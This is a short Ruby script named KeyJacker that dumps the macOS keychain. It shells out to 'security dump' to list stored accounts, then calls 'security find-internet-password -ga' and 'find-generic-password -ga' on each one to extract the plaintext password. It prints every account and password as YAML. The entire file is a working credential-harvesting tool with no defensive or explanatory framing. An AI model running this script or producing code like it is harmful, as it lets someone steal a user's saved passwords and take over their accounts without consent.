class KeyJacker
  require 'yaml'

  class << self
    def run
      get_passwords(get_accounts)
    end

    def get_accounts
      i = 0
      cmd = `security dump | egrep 'acct|desc|srvr|svce'`
      accounts = {}

      cmd.split("\n").each do |line|
        case line
          when /\"acct\"/
            i+=1
            accounts[i]={}
            accounts[i]["acct"] = line.split('<blob>=')[1].split('"')[1]
          when /\"srvr\"/
            accounts[i]["srvr"] = line.split('<blob>=')[1].split('"')[1]
          when /\"svce\"/
            accounts[i]["svce"] = line.split('<blob>=')[1].split('"')[1]
          when /\"desc\"/
            accounts[i]["desc"] = line.split('<blob>=')[1].split('"')[1]
        end
      end

      accounts
    end

    def get_passwords(accounts)
      (1..accounts.count).each do |num|
        if accounts[num].has_key?("srvr")
          cmd = `security find-internet-password -ga "#{accounts[num]["acct"]}" -s "#{accounts[num]["srvr"]}" 2>&1`
        else
          cmd = `security find-generic-password -ga "#{accounts[num]["acct"]}" -s "#{accounts[num]["svce"]}" 2>&1`
        end

        cmd.split("\n").each do |line|
          if line =~ /password: /
            accounts[num]["pass"] = line.split()[1].gsub("\"","") rescue nil
          end
        end
      end

      accounts
    end
  end
end

puts KeyJacker.run.to_yaml
